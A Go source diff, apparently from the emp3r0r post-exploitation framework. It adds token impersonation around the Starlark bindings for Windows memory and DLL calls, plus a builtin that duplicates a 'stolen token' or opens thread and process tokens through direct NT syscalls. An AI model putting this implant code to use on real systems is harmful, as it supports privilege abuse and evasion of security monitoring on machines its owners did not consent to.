@@ -7,6 +7,7 @@ import (
 	"sync"
 	"unsafe"
 
+	"github.com/jm33-m0/emp3r0r/core/lib/syscall"
 	"go.starlark.net/starlark"
 	"golang.org/x/sys/windows"
 )
@@ -30,7 +31,7 @@ func getLazyProc(dllName, procName string) *windows.LazyProc {
 }
 
 // starlarkWinCall provides an interface to execute any function within a specified DLL dynamically
-func starlarkWinCall(_ *starlark.Thread, fn *starlark.Builtin, args starlark.Tuple, kwargs []starlark.Tuple) (retVal starlark.Value, retErr error) {
+func starlarkWinCall(thread *starlark.Thread, fn *starlark.Builtin, args starlark.Tuple, kwargs []starlark.Tuple) (retVal starlark.Value, retErr error) {
 	if len(args) < 2 {
 		return starlark.None, fmt.Errorf("win_call requires at least a DLL name and a procedure name")
 	}
@@ -93,7 +94,14 @@ func starlarkWinCall(_ *starlark.Thread, fn *starlark.Builtin, args starlark.Tup
 		}
 	}()
 
-	r1, r2, callErr := proc.Call(uintptrArgs...)
+	var r1, r2 uintptr
+	var callErr error
+
+	// Run the Win32 call under impersonation if a token is set.
+	_ = runWithToken(thread, func() error {
+		r1, r2, callErr = proc.Call(uintptrArgs...)
+		return nil
+	})
 	_ = keepAlive
 
 	dict := starlark.NewDict(4)
@@ -115,7 +123,7 @@ func starlarkWinCall(_ *starlark.Thread, fn *starlark.Builtin, args starlark.Tup
 }
 
 // starlarkWinAlloc provides memory space via VirtualAlloc for data exchanges
-func starlarkWinAlloc(_ *starlark.Thread, fn *starlark.Builtin, args starlark.Tuple, kwargs []starlark.Tuple) (starlark.Value, error) {
+func starlarkWinAlloc(thread *starlark.Thread, fn *starlark.Builtin, args starlark.Tuple, kwargs []starlark.Tuple) (starlark.Value, error) {
 	var size int
 	if err := starlark.UnpackArgs(fn.Name(), args, kwargs, "size", &size); err != nil {
 		return starlark.None, err
@@ -124,7 +132,12 @@ func starlarkWinAlloc(_ *starlark.Thread, fn *starlark.Builtin, args starlark.Tu
 		return starlark.None, fmt.Errorf("allocation request size must be greater than zero")
 	}
 
-	addr, err := windows.VirtualAlloc(0, uintptr(size), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
+	var addr uintptr
+	err := runWithToken(thread, func() error {
+		var e error
+		addr, e = windows.VirtualAlloc(0, uintptr(size), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
+		return e
+	})
 	if err != nil {
 		return starlark.None, fmt.Errorf("VirtualAlloc memory assignment failed: %w", err)
 	}
@@ -132,7 +145,7 @@ func starlarkWinAlloc(_ *starlark.Thread, fn *starlark.Builtin, args starlark.Tu
 }
 
 // starlarkWinFree safely deallocates custom application pages via VirtualFree
-func starlarkWinFree(_ *starlark.Thread, fn *starlark.Builtin, args starlark.Tuple, kwargs []starlark.Tuple) (starlark.Value, error) {
+func starlarkWinFree(thread *starlark.Thread, fn *starlark.Builtin, args starlark.Tuple, kwargs []starlark.Tuple) (starlark.Value, error) {
 	var addr uint64
 	if err := starlark.UnpackArgs(fn.Name(), args, kwargs, "address", &addr); err != nil {
 		return starlark.None, err
@@ -142,7 +155,9 @@ func starlarkWinFree(_ *starlark.Thread, fn *starlark.Builtin, args starlark.Tup
 		return starlark.None, nil
 	}
 
-	err := windows.VirtualFree(uintptr(addr), 0, windows.MEM_RELEASE)
+	err := runWithToken(thread, func() error {
+		return windows.VirtualFree(uintptr(addr), 0, windows.MEM_RELEASE)
+	})
 	if err != nil {
 		return starlark.None, fmt.Errorf("VirtualFree execution failed: %w", err)
 	}
@@ -150,7 +165,7 @@ func starlarkWinFree(_ *starlark.Thread, fn *starlark.Builtin, args starlark.Tup
 }
 
 // starlarkWinReadMem copies data out of unmanaged space back into a script list of bytes safely via ReadProcessMemory
-func starlarkWinReadMem(_ *starlark.Thread, fn *starlark.Builtin, args starlark.Tuple, kwargs []starlark.Tuple) (retVal starlark.Value, retErr error) {
+func starlarkWinReadMem(thread *starlark.Thread, fn *starlark.Builtin, args starlark.Tuple, kwargs []starlark.Tuple) (retVal starlark.Value, retErr error) {
 	var addr uint64
 	var size int
 	if err := starlark.UnpackArgs(fn.Name(), args, kwargs, "address", &addr, "size", &size); err != nil {
@@ -168,8 +183,12 @@ func starlarkWinReadMem(_ *starlark.Thread, fn *starlark.Builtin, args starlark.
 
 	buf := make([]byte, size)
 	var bytesRead uintptr
-	err := windows.ReadProcessMemory(windows.CurrentProcess(), uintptr(addr), &buf[0], uintptr(size), &bytesRead)
-	if err != nil || bytesRead == 0 {
+	var rpmErr error
+	_ = runWithToken(thread, func() error {
+		rpmErr = windows.ReadProcessMemory(windows.CurrentProcess(), uintptr(addr), &buf[0], uintptr(size), &bytesRead)
+		return nil
+	})
+	if rpmErr != nil || bytesRead == 0 {
 		return starlark.None, fmt.Errorf("win_read_mem: unallocated or invalid memory address 0x%x", addr)
 	}
 
@@ -189,4 +208,71 @@ func readWinMem(addr uintptr, size int) ([]byte, error) {
 		return nil, fmt.Errorf("readWinMem: invalid memory address 0x%x", addr)
 	}
 	return buf[:bytesRead], nil
+}
+
+// starlarkCurrentToken returns a handle to the current effective token.
+// It tries OpenThreadToken first (so impersonation is visible), then falls
+// back to OpenProcessToken. The caller must close the handle.
+func starlarkCurrentToken(thread *starlark.Thread, fn *starlark.Builtin, args starlark.Tuple, kwargs []starlark.Tuple) (starlark.Value, error) {
+	if len(args) != 0 {
+		return starlark.None, fmt.Errorf("current_token takes no arguments")
+	}
+
+	// If we have a stolen token in thread-local storage, duplicate a
+	// query handle from it so the script can inspect the impersonated
+	// identity.
+	if tokenVal := thread.Local("token"); tokenVal != nil {
+		if token, ok := tokenVal.(uintptr); ok && token != 0 {
+			// Duplicate the token so the script gets its own handle.
+			hDup, status, err := syscall.NtDuplicateToken(
+				syscall.RuntimeSyscallTable,
+				windows.Handle(token),
+				windows.TOKEN_QUERY,
+				nil,
+				false,
+				syscall.TokenImpersonation,
+			)
+			if err == nil && status == 0 && hDup != 0 {
+				return starlark.MakeUint64(uint64(hDup)), nil
+			}
+		}
+	}
+
+	// No stolen token active — open the thread token (may be the process
+	// identity if not impersonating, or fail if no thread token).
+	var hToken windows.Handle
+	_ = runWithToken(thread, func() error {
+		h, status, err := syscall.NtOpenThreadToken(
+			syscall.RuntimeSyscallTable,
+			windows.CurrentThread(),
+			windows.TOKEN_QUERY,
+			false, // OpenAsSelf = FALSE: use thread identity
+		)
+		if err == nil && status == 0 {
+			hToken = h
+		}
+		return nil
+	})
+	if hToken != 0 {
+		return starlark.MakeUint64(uint64(hToken)), nil
+	}
+
+	// Fall back to process token.
+	var hProcToken windows.Handle
+	_ = runWithToken(thread, func() error {
+		h, status, err := syscall.NtOpenProcessToken(
+			syscall.RuntimeSyscallTable,
+			windows.CurrentProcess(),
+			windows.TOKEN_QUERY,
+		)
+		if err == nil && status == 0 {
+			hProcToken = h
+		}
+		return nil
+	})
+	if hProcToken != 0 {
+		return starlark.MakeUint64(uint64(hProcToken)), nil
+	}
+
+	return starlark.MakeUint64(0), nil
 }
